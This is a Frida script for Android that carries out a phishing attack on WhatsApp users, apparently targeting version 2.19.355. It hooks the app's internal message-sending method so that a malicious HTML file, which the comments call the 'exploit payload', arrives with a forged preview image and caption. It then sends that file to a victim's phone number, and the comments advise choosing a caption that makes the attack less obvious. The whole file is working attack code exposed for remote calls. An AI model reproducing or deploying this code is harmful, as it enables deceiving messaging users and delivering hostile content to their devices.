//
// Main function for performing the phishing attack against WhatsApp users.
//
// Parameters:
//
//     victim_jid - The WhatsApp JID of the victim. This is usually the victim's
//     mobile number, prefixed with the 2-digit country code and followed by the
//     string "@s.whatsapp.net" e.g. "306912345678@s.whatsapp.net".
//
//     html_filename - The HTML document that will be opened via Chrome on the
//     victim's mobile device. This is our exploit payload. This path should
//     refer to a file on the attacker's Android device.
//
//     thumbnail_filename - The path to a JPEG image file of arbitrary dimensions
//     and size (keep it small though). This is the image that will be displayed
//     to the victim's mobile device as the HTML document's preview. This path
//     should refer to a file on the attacker's Android device.
//
//     media_caption - The message caption as will appear to the victim. Choose
//     wisely to make the phishing attack less obvious.
//
// For more information on how to use this Frida module, have a look at the
// documentation that came with this exploit.
//
function _phish(victim_jid, html_filename, thumbnail_filename, media_caption) {

    // console.log("Phishing script starting up");
    send("Phishing script starting up");

    Java.perform(function() {
        var _String = Java.use("java.lang.String");
        var ArrayList = Java.use("java.util.ArrayList");
        var File = Java.use("java.io.File");
        var Files = Java.use("java.nio.file.Files");
        var Paths = Java.use("java.nio.file.Paths");
        var URI = Java.use("java.net.URI");

        var Uri = Java.use("android.net.Uri");

        //
        // WhatsApp internal classes. Valid only for 2.19.355.
        //
        var UserJid = Java.use("com.whatsapp.jid.UserJid");
        var MessageUtils = Java.use("X.1TJ");
        var FMessage = Java.use("X.1Ra");
        var FMessageMedia = Java.use("X.26I");
        var MediaSender = Java.use("X.0wd");

        try {
            //
            // Load a custom image that will be set as the HTML document's
            // thumbnail in the outgoing message. This is the image that the
            // victim will see as the message preview when the latter arrives.
            // We do a tricky `File' to `URI' to `Path' conversion here.
            //
            var customThumbnail = Files.readAllBytes(Paths.get(File.$new(thumbnail_filename).toURI()));

            //
            // buildAndSendE2EMessage()
            //
            // This method is responsible for sending E2E messages. The actual
            // message to be sent can be found in the third argument and can be
            // freely modified before being written on the wire.
            //

            //
            // Backup previous hook, if any.
            //
            var implementation = MessageUtils.A0A.implementation;

            //
            // Install new hook that modifies the message preview.
            //
            MessageUtils.A0A.implementation = function(_1, _2, fMessage, _3, _4, _5) {

                // console.log("Modifying outgoing document message");
                send("Modifying outgoing document message");

                //
                // We have to cast the message object to its actual type, so
                // that Frida can introspect.
                //
                fMessage = Java.cast(fMessage, FMessage);

                //
                // Read message type.
                //
                var type = fMessage._A0e.value;

                //
                // Detect outgoing document messages and set the document preview
                // to our own thumbnail image.
                //
                if(type == 9) {
                    fMessage._A0K.value._A03.value = customThumbnail;

                    //
                    // Now change the media caption. To do that, we have to cast
                    // the message object to `FMessageMedia' first.
                    //
                    var fMessageMedia = Java.cast(fMessage, FMessageMedia);
                    fMessageMedia.A04.value = _String.$new(media_caption);

                    // console.log("Document message was successfully modified");
                    send("Document message was successfully modified");
                }

                //
                // We are done. Call the original method.
                //
                var ret = this.A0A(_1, _2, fMessage, _3, _4, _5);

                //
                // Remove this hook, so that further outgoing document messages
                // are not modified.
                //
                MessageUtils.A0A.implementation = implementation;

                return ret;
            }

            //
            // Several WhatsApp API calls expect a list of JIDs. Create a single
            // `UserJid' instance and insert it in an `ArrayList'.
            //
            var jid = UserJid.get(_String.$new(victim_jid));

            var jidList = ArrayList.$new();
            jidList.add(jid);

            //
            // The method that sends documents expects a `Uri', *not* a `File' :)
            //
            var uri = Uri.fromFile(File.$new(html_filename));

            //
            // Get `MediaSender' singleton instance.
            //
            var mediaSender = MediaSender.A00();

            //
            // sendDocumentMessage()
            //
            mediaSender.A05(jidList, uri, "text/html", null, null, false);
        }
        catch(exception) {
            // console.log(exception.message);
            send(exception.message);
        }
    });
}

rpc.exports = {
    phish: function(victim_jid, html_filename, thumbnail_filename, media_caption) {
        _phish(victim_jid, html_filename, thumbnail_filename, media_caption);
    }
}

